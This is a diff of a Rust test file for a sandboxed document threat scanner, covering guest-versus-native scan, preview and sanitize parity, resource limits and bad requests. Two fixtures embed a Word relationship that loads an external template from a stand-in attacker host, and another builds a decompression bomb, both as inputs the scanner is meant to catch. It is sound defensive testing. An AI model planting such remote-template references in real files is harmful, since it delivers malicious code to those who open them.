@@ -16,12 +16,30 @@
 #![allow(clippy::print_stderr, reason = "skip notice and corpus statistics")]
 #![allow(clippy::unwrap_used, clippy::panic, reason = "test fixtures outside #[test] functions")]
 
+use arca_abi::request::{Op, flags, header};
 use arca_container::zip::writer::{Compression, ZipWriter};
-use arca_guest_xray::decode_report;
+use arca_guest_xray::{decode_preview, decode_report, decode_sanitized};
 use arca_sandbox::{
-    CancelToken, FuelPolicy, GuestModule, RunOptions, Sandbox, SandboxError, SandboxPolicy,
+    CancelToken, FuelPolicy, GuestModule, GuestOutput, RunOptions, Sandbox, SandboxError,
+    SandboxPolicy,
 };
 use arca_xray::{ThreatKind, Verdict};
+
+fn run_op(
+    sandbox: &Sandbox,
+    m: &GuestModule,
+    op: Op,
+    op_flags: u32,
+    doc: &[u8],
+    options: &RunOptions,
+) -> Result<GuestOutput, SandboxError> {
+    sandbox.run_request(m, &header(op, op_flags), doc, options)
+}
+
+/// Threat X-ray of `doc` through the guest.
+fn scan(sandbox: &Sandbox, m: &GuestModule, doc: &[u8]) -> Result<GuestOutput, SandboxError> {
+    run_op(sandbox, m, Op::Scan, 0, doc, &RunOptions::new())
+}
 
 /// `true` when a skipped end-to-end test must fail instead (CI).
 fn e2e_required() -> bool {
@@ -137,7 +155,7 @@ fn ordinary_spreadsheets_fit_the_default_budget() {
     let sandbox = Sandbox::new(policy, [m.pin()]);
     for rows in [300, 1_200] {
         let doc = xlsx(rows);
-        let out = sandbox.run(&m, &doc).unwrap_or_else(|e| panic!("{rows} rows: {e}"));
+        let out = scan(&sandbox, &m, &doc).unwrap_or_else(|e| panic!("{rows} rows: {e}"));
         let report = decode_report(out.kind, &out.payload).unwrap();
         assert_eq!(report.verdict, Verdict::Clean, "{rows} rows");
         assert_eq!(report, arca_xray::scan_default(&doc), "{rows} rows: guest != native");
@@ -171,7 +189,7 @@ fn guest_report_equals_native_report() {
         r#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://attacker.example/t.dotm" TargetMode="External"/></Relationships>"#,
     )]);
     for doc in [docx(&[]), template] {
-        let out = sandbox.run(&m, &doc).unwrap();
+        let out = scan(&sandbox, &m, &doc).unwrap();
         let report = decode_report(out.kind, &out.payload).unwrap();
         assert_eq!(report, arca_xray::scan_default(&doc));
         assert!(out.stats.fuel_consumed > 0);
@@ -187,7 +205,7 @@ fn guest_rejects_bombs_inside_the_sandbox() {
     let sandbox = Sandbox::new(SandboxPolicy::default(), [m.pin()]);
     let bomb = "A".repeat(40 << 20);
     let doc = docx(&[("word/media/bomb.xml", &bomb)]);
-    let out = sandbox.run(&m, &doc).unwrap();
+    let out = scan(&sandbox, &m, &doc).unwrap();
     let report = decode_report(out.kind, &out.payload).unwrap();
     assert_eq!(report.verdict, Verdict::Rejected);
     assert!(report.has(ThreatKind::CompressionBomb));
@@ -206,7 +224,7 @@ fn starved_guest_is_stopped() {
         ..SandboxPolicy::default()
     };
     let sandbox = Sandbox::new(policy, [m.pin()]);
-    assert!(matches!(sandbox.run(&m, &docx(&[])), Err(SandboxError::FuelExhausted { .. })));
+    assert!(matches!(scan(&sandbox, &m, &docx(&[])), Err(SandboxError::FuelExhausted { .. })));
     // A 3 MiB input cannot even be copied into a guest capped at 2 MiB.
     let policy = SandboxPolicy { max_memory_bytes: 2 << 20, ..SandboxPolicy::default() };
     let sandbox = Sandbox::new(policy, [m.pin()]);
@@ -219,7 +237,7 @@ fn starved_guest_is_stopped() {
             x.to_le_bytes()[0]
         })
         .collect();
-    assert_eq!(sandbox.run(&m, &noise).unwrap_err(), SandboxError::MemoryLimitExceeded);
+    assert_eq!(scan(&sandbox, &m, &noise).unwrap_err(), SandboxError::MemoryLimitExceeded);
 }
 
 #[test]
@@ -234,8 +252,8 @@ fn slicing_does_not_change_the_guest_result() {
     )]);
     let whole = SandboxPolicy { slice_fuel: u64::MAX, ..SandboxPolicy::default() };
     let sliced = SandboxPolicy { slice_fuel: 20_000, ..SandboxPolicy::default() };
-    let a = Sandbox::new(whole, [m.pin()]).run(&m, &doc).unwrap();
-    let b = Sandbox::new(sliced, [m.pin()]).run(&m, &doc).unwrap();
+    let a = scan(&Sandbox::new(whole, [m.pin()]), &m, &doc).unwrap();
+    let b = scan(&Sandbox::new(sliced, [m.pin()]), &m, &doc).unwrap();
     assert_eq!(a.stats.slices, 1);
     assert!(b.stats.slices > 1, "the real guest should need several 20k-fuel slices");
     assert_eq!(a.stats.fuel_consumed, b.stats.fuel_consumed);
@@ -254,7 +272,10 @@ fn the_real_guest_can_be_cancelled_and_timed_out() {
     let token = CancelToken::new();
     token.cancel();
     let cancelled = RunOptions::new().cancel_token(token);
-    assert_eq!(sandbox.run_with(&m, &doc, &cancelled).unwrap_err(), SandboxError::Cancelled);
+    assert_eq!(
+        run_op(&sandbox, &m, Op::Scan, 0, &doc, &cancelled).unwrap_err(),
+        SandboxError::Cancelled
+    );
 
     // Cancelled from the progress callback of the very same run: the host
     // abandons the guest in the middle of `arca_run`.
@@ -267,11 +288,14 @@ fn the_real_guest_can_be_cancelled_and_timed_out() {
     });
     let tiny = SandboxPolicy { slice_fuel: 20_000, ..SandboxPolicy::default() };
     let sandbox = Sandbox::new(tiny, [m.pin()]);
-    assert_eq!(sandbox.run_with(&m, &doc, &options).unwrap_err(), SandboxError::Cancelled);
+    assert_eq!(
+        run_op(&sandbox, &m, Op::Scan, 0, &doc, &options).unwrap_err(),
+        SandboxError::Cancelled
+    );
 
     let limit = std::time::Duration::from_nanos(1);
     assert_eq!(
-        sandbox.run_with(&m, &doc, &RunOptions::new().deadline(limit)).unwrap_err(),
+        run_op(&sandbox, &m, Op::Scan, 0, &doc, &RunOptions::new().deadline(limit)).unwrap_err(),
         SandboxError::DeadlineExceeded { limit }
     );
 }
@@ -295,9 +319,26 @@ fn real_world_corpus_if_provided() {
             continue;
         }
         let data = std::fs::read(&path).unwrap();
-        let out = sandbox.run(&m, &data).unwrap_or_else(|e| panic!("{path:?}: {e}"));
+        let out = scan(&sandbox, &m, &data).unwrap_or_else(|e| panic!("{path:?}: {e}"));
         let report = decode_report(out.kind, &out.payload).unwrap();
         assert_eq!(report, arca_xray::scan_default(&data), "{path:?}");
+        // The preview through the guest equals the native preview byte for byte.
+        let policy = arca_preview::PreviewPolicy::default();
+        let native = arca_preview::preview(&data, &policy);
+        let guest =
+            run_op(&sandbox, &m, Op::Preview, flags::REVEAL_HIDDEN, &data, &RunOptions::new());
+        match (native, guest) {
+            (Ok(n), Ok(g)) => {
+                assert_eq!(g.status, arca_abi::status::OK, "{path:?}");
+                assert_eq!(decode_preview(g.kind, &g.payload).unwrap(), n, "{path:?}: preview");
+            }
+            (Err(_), Ok(g)) => {
+                // Unsupported (6) or failed (7) is reported as a status plus an error envelope.
+                assert!(g.status == 6 || g.status == 7, "{path:?}: status {}", g.status);
+                assert!(decode_preview(g.kind, &g.payload).is_err());
+            }
+            (n, g) => panic!("{path:?}: native {:?} vs guest {:?}", n.map(|_| ()), g.map(|_| ())),
+        }
         eprintln!(
             "{:<32} {:<10} {:<24} fuel={:>12} mem={:>6} KiB",
             path.file_name().unwrap().to_string_lossy(),
@@ -307,4 +348,86 @@ fn real_world_corpus_if_provided() {
             out.stats.peak_memory_bytes / 1024
         );
     }
+}
+
+#[test]
+fn guest_preview_equals_native_preview() {
+    let Some(m) = guest() else {
+        eprintln!("skipped: ARCA_GUEST_XRAY_WASM not set");
+        return;
+    };
+    let sandbox = Sandbox::new(SandboxPolicy::default(), [m.pin()]);
+    for doc in [docx(&[]), xlsx(300)] {
+        for reveal in [flags::REVEAL_HIDDEN, 0] {
+            let out = run_op(&sandbox, &m, Op::Preview, reveal, &doc, &RunOptions::new()).unwrap();
+            let got = decode_preview(out.kind, &out.payload).unwrap();
+            let policy = arca_preview::PreviewPolicy {
+                reveal_hidden: reveal != 0,
+                ..arca_preview::PreviewPolicy::default()
+            };
+            assert_eq!(got, arca_preview::preview(&doc, &policy).unwrap());
+            assert!(!got.sections.is_empty());
+        }
+    }
+}
+
+#[test]
+fn guest_sanitize_equals_native_sanitize() {
+    let Some(m) = guest() else {
+        eprintln!("skipped: ARCA_GUEST_XRAY_WASM not set");
+        return;
+    };
+    let sandbox = Sandbox::new(SandboxPolicy::default(), [m.pin()]);
+    let doc = docx(&[(
+        "word/_rels/document.xml.rels",
+        r#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://attacker.example/t.dotm" TargetMode="External"/></Relationships>"#,
+    )]);
+    let out =
+        run_op(&sandbox, &m, Op::Sanitize, flags::SANITIZE_ALL, &doc, &RunOptions::new()).unwrap();
+    let got = decode_sanitized(out.kind, &out.payload).unwrap();
+    let native = arca_xray::sanitize::sanitize(
+        &doc,
+        &arca_xray::ScanPolicy::default(),
+        &arca_xray::sanitize::SanitizeOptions::default(),
+    )
+    .unwrap();
+    assert_eq!(got, native);
+    assert_eq!(got.verification.verdict, Verdict::Clean);
+    // Plain text cannot be rebuilt: a status, not a trap.
+    let out = run_op(&sandbox, &m, Op::Sanitize, flags::SANITIZE_ALL, b"text", &RunOptions::new())
+        .unwrap();
+    assert_eq!(out.status, arca_abi::status::UNSUPPORTED_FORMAT);
+    assert!(decode_sanitized(out.kind, &out.payload).is_err());
+}
+
+#[test]
+fn bad_requests_are_statuses_not_traps() {
+    let Some(m) = guest() else {
+        eprintln!("skipped: ARCA_GUEST_XRAY_WASM not set");
+        return;
+    };
+    let sandbox = Sandbox::new(SandboxPolicy::default(), [m.pin()]);
+    // Not a request at all.
+    let out = sandbox.run(&m, &docx(&[])).unwrap();
+    assert_eq!(out.status, arca_abi::status::BAD_REQUEST);
+    assert_eq!(out.kind, arca_abi::envelope::PayloadKind::Error);
+    // Flags the operation does not define.
+    let out = run_op(&sandbox, &m, Op::Scan, 1, &docx(&[]), &RunOptions::new()).unwrap();
+    assert_eq!(out.status, arca_abi::status::BAD_REQUEST);
+}
+
+#[test]
+fn preview_of_a_large_spreadsheet_stays_inside_the_budget() {
+    let Some(m) = guest() else {
+        eprintln!("skipped: ARCA_GUEST_XRAY_WASM not set");
+        return;
+    };
+    let sandbox = Sandbox::new(SandboxPolicy::default(), [m.pin()]);
+    let doc = xlsx(1_200);
+    let out =
+        run_op(&sandbox, &m, Op::Preview, flags::REVEAL_HIDDEN, &doc, &RunOptions::new()).unwrap();
+    let p = decode_preview(out.kind, &out.payload).unwrap();
+    assert!(!p.stats.truncated);
+    let per_byte = out.stats.fuel_consumed / u64::try_from(doc.len()).unwrap();
+    assert!(per_byte < sandbox.policy().fuel.per_input_byte / 2, "{per_byte} fuel per input byte");
 }
